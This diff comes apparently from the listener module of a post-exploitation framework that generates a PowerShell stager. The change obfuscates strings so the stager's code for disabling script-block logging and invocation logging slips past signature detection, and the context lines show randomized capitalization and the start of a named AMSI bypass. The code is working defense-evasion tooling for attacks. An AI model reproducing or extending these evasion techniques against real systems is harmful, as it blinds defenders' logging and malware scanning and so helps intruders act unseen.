@@ -181,9 +181,9 @@ class Listener:
                     stager += helpers.randomize_capitalization(").\"GetFie`ld\"(")
                     stager += "'cachedGroupPolicySettings', 'N'+'onPublic,Static'"
                     stager += helpers.randomize_capitalization(").GetValue($null);$GroupPolicySettings")
-                    stager += "['ScriptBlockLogging']['EnableScriptBlockLogging'] = 0;"
+                    stager += "['ScriptB'+'lockLogging']['EnableScriptB'+'lockLogging'] = 0;"
                     stager += helpers.randomize_capitalization("$GroupPolicySettings")
-                    stager += "['ScriptBlockLogging']['EnableScriptBlockInvocationLogging'] = 0;"
+                    stager += "['ScriptB'+'lockLogging']['EnableScriptBlockInvocationLogging'] = 0;"
 
                     # @mattifestation's AMSI bypass
                     stager += helpers.randomize_capitalization("[Ref].Assembly.GetType(")
